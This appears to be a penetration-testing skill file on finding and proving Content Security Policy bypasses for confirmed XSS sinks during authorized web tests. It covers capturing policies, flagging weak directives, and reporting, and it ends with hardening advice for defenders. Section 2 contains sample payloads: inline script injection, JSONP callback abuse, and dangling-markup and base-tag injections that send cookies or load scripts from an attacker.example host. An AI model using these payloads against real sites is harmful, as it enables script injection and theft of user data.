---
name: xss-csp-bypass
description: Use when an XSS sink is confirmed but a Content Security Policy
  blocks inline script execution on an authorized test. Covers CSP parsing
  and weakness analysis, unsafe-inline and allow-list gaps, JSONP and
  dangling-markup exfiltration, and nonce or hash weaknesses. Use when the
  page sends a Content-Security-Policy header, when inline payloads are
  blocked but the sink is real, or when assessing whether a CSP is a real
  defense layer or just decoration.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-xss
requires: [web-xss]
extends: []
relates: [web-sqli]
tools:
  - name: curl
    version: 8.5
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

Content Security Policy is a second layer that can neuter an XSS sink by
blocking inline scripts, but most deployed policies have gaps: overly broad
allow-lists, `unsafe-inline` fallbacks, missing `object-src`, or trusted
scripts with JSONP endpoints. This skill covers analyzing a CSP for bypasses
on authorized tests and proving which gaps are real. A strong CSP does not
erase the underlying XSS; it only contains it, so the sink finding stands
regardless.

## Quick Workflow

1. Capture the exact CSP from headers and meta tags on every relevant page.
2. Parse it directive by directive: `script-src`, `object-src`,
   `base-uri`, `default-src`, `frame-src`.
3. Flag weaknesses: `unsafe-inline`, `unsafe-eval`, broad hosts,
   allow-listed CDNs with JSONP, missing directives.
4. Test each weakness with a targeted payload in a real browser.
5. If no bypass exists, document the CSP as effective containment and keep
   the XSS finding with reduced impact.
6. Record the policy text and every tested bypass attempt.

## 1. Capturing and parsing the policy

```bash
# Get the raw policy from headers
curl -s -D - 'https://target.example/app' -o /dev/null | grep -i 'content-security-policy'

# Check meta-tag policies too (weaker, but they apply)
curl -s 'https://target.example/app' | grep -o '<meta[^>]*Content-Security-Policy[^>]*>'

# Pretty-print the directives for analysis
curl -s -D - 'https://target.example/app' -o /dev/null \
  | grep -i '^content-security-policy:' | tr ';' '\n'
```

Read every directive. Common gaps: no `object-src` (falls back to
`default-src` or allows plugins), `script-src` with `unsafe-inline`,
`*.example.com` wildcards an attacker can claim a subdomain of, and
allow-listed script hosts that serve JSONP or open redirects.

## 2. Testing common bypasses

```bash
# Gap 1: unsafe-inline present -> classic inline payload still works
# "><script>console.log('csp-inline')</script>

# Gap 2: allow-listed CDN with JSONP endpoint
# <script src="https://trusted-cdn.example/jsonp?callback=console.log"></script>

# Gap 3: dangling markup exfiltration needs no script execution at all
# "><img src="https://attacker.example/x?cookie=  (unclosed quote steals following content)

# Gap 4: base-uri missing -> inject <base href="https://attacker.example/">
# then relative script URLs load from the attacker

# Gap 5: nonce reuse or predictable nonces
# fetch two pages, compare nonce values; equal nonces mean replay
for i in 1 2; do
  curl -s 'https://target.example/app' | grep -o "nonce-[^\"']*" | head -1
done
```

Test in a real browser with DevTools open: the console logs exactly which
directive blocked each attempt, which tells you what to try next.

## 3. Reporting CSP posture honestly

A CSP assessment has three honest outcomes, and the report must pick one.

```bash
# Outcome A: bypass found -> XSS keeps full impact, CSP is broken
# Outcome B: no bypass, policy tight -> XSS contained, impact reduced
# Outcome C: no CSP at all -> note the missing layer alongside the XSS

# Quick strictness checklist to paste into notes:
# [ ] script-src without unsafe-inline and without broad hosts
# [ ] object-src 'none'
# [ ] base-uri 'self' or absent injection point
# [ ] nonces unique per response (or hashes for static scripts)
# [ ] report-uri or report-to configured
```

Never claim a CSP bypass you did not execute in a browser. Console block
messages are evidence of failure, not success.

## Edge cases

- Multiple policies combine (header plus meta tag). The browser enforces
  the intersection of all policies, so the strictest combination wins;
  test against the real combined behavior, not one policy in isolation.
- `report-only` policies block nothing. Check the header name:
  `Content-Security-Policy-Report-Only` is monitoring, not enforcement.
- The policy differs between pages. The login page may be strict while the
  vulnerable page is lax; assess the policy on the page with the sink.
- Nonces look random but repeat per session. Compare across sessions and
  users, not just across two requests in one session.

## Escalation

- No bypass in the policy: accept containment, keep the XSS finding with
  accurately reduced impact, and recommend policy hardening as defense in
  depth.
- You suspect a JSONP bypass on an allow-listed host: verify the endpoint
  actually reflects the callback unsafely; many JSONP endpoints were
  fixed, and an unexploitable allow-list entry is not a bypass.
- The engagement wants a full CSP review: expand to every page and every
  directive, and deliver the strictness checklist as a separate section.

## Detection and defender view

Defenders see CSP bypass testing as repeated page loads with odd script
URLs and fragment probes, plus `report-uri` violation reports if
reporting is configured (which is itself useful telemetry). A bypass that
succeeds shows as script execution the policy should have stopped.
Durable defense is a strict policy: nonces or hashes for scripts,
`object-src 'none'`, `base-uri 'self'`, no broad allow-lists, and
violation reporting wired into the SOC.

## Key references

- CWE-79 (Improper Neutralization of Input During Web Page Generation,
  Cross-site Scripting).
- OWASP Content Security Policy Cheat Sheet.
- PortSwigger Web Security Academy: CSP bypass labs.
- Content Security Policy Level 3 specification (W3C).
